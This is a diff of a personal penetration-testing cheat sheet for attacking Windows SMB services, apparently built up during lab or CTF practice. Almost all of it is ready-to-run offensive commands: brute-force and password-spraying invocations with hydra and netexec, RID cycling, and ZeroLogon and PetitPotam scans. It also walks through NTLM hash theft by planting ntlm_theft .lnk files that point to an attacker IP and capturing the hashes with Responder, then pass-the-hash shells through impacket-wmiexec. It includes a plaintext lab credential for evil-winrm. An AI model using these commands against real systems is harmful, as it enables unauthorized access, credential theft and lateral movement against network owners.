@@ -16,20 +16,31 @@
 	- smb-enum-sessions - enumerate all sessions on remote Windows system
 	- nbtstat - enumerate the target’s NetBIOS names and MAC address
 	
+	nmap --script smb-brute -p 139,445 <target-ip>
+	nmap --script smb-enum-shares.nse,smb-enum-users.nse -p 139,445 <target-ip>
+	nmap --script smb-enum* -p 139,445 <target-ip>
+	nmap --script smb-protocols -p 139,445 <target-ip>
+	nmap --script smb-vuln* -p 139,445 <target-ip>
+	
 	It is good practice to run smb-enum* to collect general information about the server and smb-vuln* to collect information about any known exploits that might affect the server..
 			
     sudo nmap --script smb-enum-shares -p 139,445 <Target IP> OR sudo nmap --script smb-enum* -p 139,445 <Target IP> --> enumerate all ( shares, users, groups ecc ecc )
  
 	sudo nmap --script smb-vuln* -p 139,445 <Target IP> --> NSE Script to check for vulnerabilities , * stand for check all
 	
+	
+	
  
  ===[ SMBCLIENT ]===
- smbclient -L <target IP> --> list share
+ smbclient -L/-N <target IP> --> list share
 	-L	list share ( or enum share ) 
-	-N Anonymous user ( current user)
- 
- smbclient [-U username] [-P password or -N for no password] -L \\\\X.X.X.X --> list share as current user without password
- smbclient [-U username] [-P password or -N for no password] \\\\X.X.X.X\\share	--> connect to share as current user without password
+	-N Anonymous user or No password
+
+	smbclient -N -L <target-ip>
+	smbclient -L <target-ip> -U username
+	
+	smbclient [-U username] [-P password or -N for no password] -L \\\\X.X.X.X --> list share as current user without password
+	smbclient [-U username] [-P password or -N for no password] \\\\X.X.X.X\\share	--> connect to share as current user without password
  
  ===[ SMBMAP ]===
  smbmap -H <Target IP> --> enumerate the target IP as unathenticated user
@@ -42,6 +53,9 @@
  -R [Folder] --> recursive listing
  -A <filename> --> search for a filename
  -q for quiet verbose output
+ 
+ ### Execute a command ###
+	smbmap -u username -p password -H <target-ip> -x 'ipconfig'
  
  ===[ RPCCLIENT ]===
  rpcclient -U "" -N <Target IP>
@@ -59,7 +73,23 @@
  and other commands
  
  ===[ ENUM4LINUX ]===
- enum4linux -U <target IP> --> User ( and others )
+BASIC 
+enum4linux <target-ip>
+# All enumeration
+enum4linux -a <target-ip>
+# Verbose
+enum4linux -v <target-ip>
+# Specify username and password
+enum4linux -u username -p password <target-ip>
+
+# Enum4linux-ng
+# -A: All simple enumeration including nmblookup
+enum4linux-ng -A <target-ip>
+# -As: All simple short enumeration without NetBIOS names lookup
+enum4linux-ng -As <target-ip>
+# -u: Specific username
+# -p: Specific password
+enum4linux-ng -u "administrator" -p "password" <target-ip>
  
  ===[ CRACKMAPEXEC ]===
  https://github.com/byt3bl33d3r/CrackMapExec
@@ -177,11 +207,29 @@ Available Protocols:
  SMB3.1		Windows 10		Windows Server 20016		ONTAP 9
 
 
+ ===[ NetExec (https://www.netexec.wiki/) ]===
+netexec smb 10.0.0.0/24
+netexec smb <target-ip>
+netexec smb <target-ip-1> <target-ip-2>
+netexec smb <target-ip> --pass-pol
+netexec smb <target-ip> --groups
+netexec smb <target-ip> --users
+# With authentication
+netexec smb <target-ip> -u username -p password
+netexec smb <target-ip> -u username -p password --users
+# With Kerberos authentication
+netexec smb <target-ip> -k --users
+# -M zerologon: Scan for ZeroLogon
+# -M petitpotam: Scan for PetitPotam
+netexec smb <target-ip> -u '' -p '' -M zerologon -M petitpotam
+
+ ### List Shares ###
+netexec smb <target-ip> -u '' -p '' --shares
+netexec smb <target-ip> -u username -p password --shares
+
+ ===[ EVIL-WINRM]===
 
 evil-winrm -i 10.129.37.195 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
-
-whoami /priv
-
 
  ===[ LDAPSEARCH ]===
  
@@ -194,3 +242,93 @@ whoami /priv
 	'(objectClass=Person|User)'	query for element classified as person or user
 	sAMAccountName			restrict query to account name only
  '{ print $2 }' 
+ 
+ ====[ BRUTE FORCE CREDENTIALS ]====
+ netexec smb <target-ip> -u username -p passwords.txt --continue-on-success
+	netexec smb <target-ip> -u usernames.txt -H ntlm_hashes.txt --continue-on-success
+
+	hydra -l username -P passwords.txt <target-ip> smb
+	hydra -L usernames.txt -p password <target-ip> smb
+
+	# RID Brute Force
+	netexec smb <target-ip> -u username -p password --rid-brute 20000
+
+	# Using Metasploit
+	msfconsole
+	msf> use auxiliary/scanner/smb/smb_login
+
+	#### If we find credentials, we can use them for smbclient or WinRM.
+	#### If we got "STATUS_PASSWORD_MUST_CHANGE" for some users, we can update a current password to a new one.
+
+	smbpasswd -r <target-ip> -U <username>
+	# or
+	impacket-smbpasswd <DOMAIN>/<username>:<password>@<target-ip> -newpass <new-password>
+	# If you don't have impacket-smbpasswd, download it from a repository.
+	wget https://raw.githubusercontent.com/fortra/impacket/master/examples/smbpasswd.py
+	
+ ====[ RID enumeration ]====
+	It attempts to enumerate user accounts through null sessions.
+	
+	# Anonymous logon
+	# 20000: Maximum RID to be cycled
+	impacket-lookupsid example.local/anonymous@<target-ip> 20000 -no-pass
+	impacket-lookupsid example.local/guest@<target-ip> 20000 -no-pass
+	impacket-lookupsid example.local/guest@<target-ip> 20000
+	# Specify user
+	impacket-lookupsid example.local/user@<target-ip> 20000 -hashes <lmhash>:<nthash>
+	impacket-lookupsid example.local/user@<target-ip> 20000
+
+
+	# USEFUL COMMAND
+	# This command extract usernames. It's useful for further enumeration which uses usernames.
+	# Replace the following keywords:
+	#  - `example.com` => Target domain
+	#  - `10.0.0.1`    => Target IP
+	#  - `DOMAIN`      => Target domain name
+	impacket-lookupsid example.com/guest@10.0.0.1 20000 -no-pass > tmp.txt | cat tmp.txt | grep SidTypeUser | cut -d ' ' -f 2 | sed 's/DOMAIN\\//g' | sort -u > users.txt && rm tmp.txt
+
+	====[ PASSWORD SPRAYING ATTACK ]====
+	If we have a user password, we might be able to find another user with the same password.
+	# User enumeration
+	netexec smb <target-ip> -u John -p Password123 --users
+	netexec smb <target-ip> -u John -H <NTLM_HASH> --users
+
+	# Find users with same password
+	netexec smb <target-ip> -u users.txt -p Password123 --continue-on-success
+	netexec smb <target-ip> -u users.txt -p found_passwords.txt --continue-on-success
+	netexec smb <target-ip> -u users.txt -H <NTLM_HASH> --continue-on-success
+	netexec smb <target-ip> -u users.txt -H found_ntlm_hashes.txt --continue-on-success
+
+	====[ NTLM THEFT ]====
+
+	Repository: https://github.com/Greenwolf/ntlm_theft
+	# -g all: Generate all files.
+	# -s: Local IP (attacker IP)
+	# -f: Folder to store generated files.
+	python3 ntlm_theft -g all -s <local-ip> -f samples
+	After generating files with ntlm_theft , put the .lnk file (samples.lnk here) to the shared folder.
+	smbclient -N //10.0.0.1/example
+
+	smb> put samples.lnk
+	
+	Now start Responder to retrieve the stolen NTLM hashes. Run the following command in our local machine:
+
+	sudo responder -I eth0
+	
+	You can use smbclient to connect the target.
+
+	# anonymous login
+	smbclient //10.0.0.1/somedir -N
+	# If the folder name contains spaces, surround with double quotes
+	smbclient "//10.0.0.1/some dir" -N
+	# Specify user
+	smbclient //10.0.0.1/somedir -U username
+	# nobody, no-pass
+	smbclient //10.0.0.1/somedir -N -U nobody
+	# Specify workgroup
+	smbclient -L 10.0.0.1 -W WORKGROUP -U username
+	
+	To get a Windows shell, run the following examples.
+	impacket-wmiexec example.local/username@10.0.0.1
+	# Pass the Hash
+	impacket-wmiexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d example.local/username@10.0.0.1
